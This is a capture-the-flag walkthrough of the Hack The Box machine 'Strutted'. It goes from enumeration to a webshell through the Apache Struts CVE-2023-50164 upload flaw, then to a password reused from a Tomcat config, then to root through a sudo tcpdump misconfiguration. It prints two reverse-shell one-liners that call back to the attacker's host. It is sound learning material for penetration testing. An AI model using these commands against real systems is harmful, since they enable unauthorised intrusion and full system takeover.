| **Machine**             | \[Strutted]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Medium                                                                                                                           |
| **Key Vulnerabilities** | `Apache Struts RCE (CVE-2023-50164)`, `Misconfigured SUID Binary (tcpdump)`, `Exposed Sensitive Files`, `Information Disclosure` |

# Enumeration

Running nmap, we discover two open ports: HTTP and SSH.
└─$ sudo nmap -sCV 10.129.231.200 -p- --min-rate=1000 -oN nmap_long

```bash
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 13:41 EDT
Nmap scan report for 10.129.231.200
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Visiting the site, we see an upload form.

<img width="2211" height="1080" alt="2025-08-04 194704" src="https://github.com/user-attachments/assets/4d6df9d5-c116-44a2-b677-6812097a3fc9" />
I tried some basic upload exploits here, but they didn’t work. I decided to move on for now.

Running ffuf, we discover three directories:
```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://strutted.htb/FUZZ -c -fs 5197 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://strutted.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5197
________________________________________________

about                   [Status: 200, Size: 6610, Words: 2173, Lines: 182, Duration: 484ms]
download                [Status: 200, Size: 39680602, Words: 0, Lines: 0, Duration: 0ms]
how                     [Status: 200, Size: 6119, Words: 2054, Lines: 182, Duration: 755ms]
```
Visiting /download, we get a strutted.zip file. After unzipping it, we find a bunch of files:
```bash
└─$ ls
context.xml  Dockerfile  README.md  strutted  strutted.zip  tomcat-users.xml
```
Inside tomcat-users.xml, we find some credentials:
```bash
<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="<REDACTED>" roles="manager-gui,admin-gui"/>
</tomcat-users>
```
But there’s no /manager/html page, the default admin login path — so this password is kinda useless for now. Might come in handy later.

# Foothold

In the strutted folder, there's a pom.xml file, the most intersting part is this:

```xml
<properties>
    <struts2.version>6.3.0.1</struts2.version>
</properties>
```
> pom.xml is a config file in Java projects that defines dependencies and build settings.

Looking up vulnerabilities for Struts 6.3.0.1, I found CVE 2023-50164.

>A critical RCE vuln (CVE-2023-50164, CVSS 9.8) lets attackers manipulate file upload params to gain RCE.

[I tried this PoC](https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE), but at first, it didn’t work.

```bash
└─$ python3 exploit.py --url http://strutted.htb/
[+] Starting exploitation...
[+] WAR file already exists.
[+] webshell.war uploaded successfully.
[+] Reach the JSP webshell at http://strutted.htb/webshell/webshell.jsp?cmd=<COMMAND>
[+] Attempting a connection with webshell.
[-] Maximum attempts reached. Exiting...
```
This was actually the hardest and longest part.
Looking at script, I suspected that it didn`t work because the web root was deeper than expected, so I adjusted the number of parent directories in the path parameter, plus i added gif magic bytes to the script for the file_content parameter… and finally got it working:

<img width="1665" height="853" alt="2025-08-05 114246" src="https://github.com/user-attachments/assets/42d51827-fdb8-4f22-87a4-989c24a64baa" />

<img width="1187" height="285" alt="2025-08-05 115534" src="https://github.com/user-attachments/assets/b9d8c57b-1ac8-4359-a113-0f5cd36fbf4d" />

Started a local listener on port 9001 and used this command to get a reverse shell:
```bash
CMD > busybox nc 10.10.14.73 9001 -e /bin/bash
```
```bash
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.73] from (UNKNOWN) [10.129.231.200] 35386

id
uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
```
Upgrading to an interactive TTY shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
# Shell as james
Checking /etc/passwd, we see:
```bash
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
```
Tried using the credentials we found earlier at the beginning, but didn't work for james. Then I found another password in tomcat-users.xml file in /var/lib/tomcat9/conf

<img width="1470" height="1032" alt="2025-08-05 130322" src="https://github.com/user-attachments/assets/46f6196f-ecca-4a95-9857-7f83b07809d1" />
(I got stuck for a bit here because I kept trying su - james, but it failed.)

Use ssh to autenticate as james, and get the first flag
<img width="590" height="98" alt="2025-08-05 134050" src="https://github.com/user-attachments/assets/ae4c6cff-e15a-4240-88a0-6bfa32b11f52" />

# Privilege Escalation
Checking sudo privileges
```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump

```
Easy win. According to [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/#sudo), we can abuse tcpdump binary to get root shell.

<img width="1455" height="392" alt="2025-08-05 140040" src="https://github.com/user-attachments/assets/68e706d9-a95a-400c-9e68-f7a7a1e7f774" />

I will just the "COMMAND" variable to a `/bin/bash -i >& /dev/tcp/10.10.14.73/9002 0>&1` and start a local listener on port 9002.

<img width="1144" height="377" alt="2025-08-05 140708" src="https://github.com/user-attachments/assets/21e4788b-5dc3-4595-86b6-97ab921d29d6" />
And that’s it, root flag grabbed, box done.
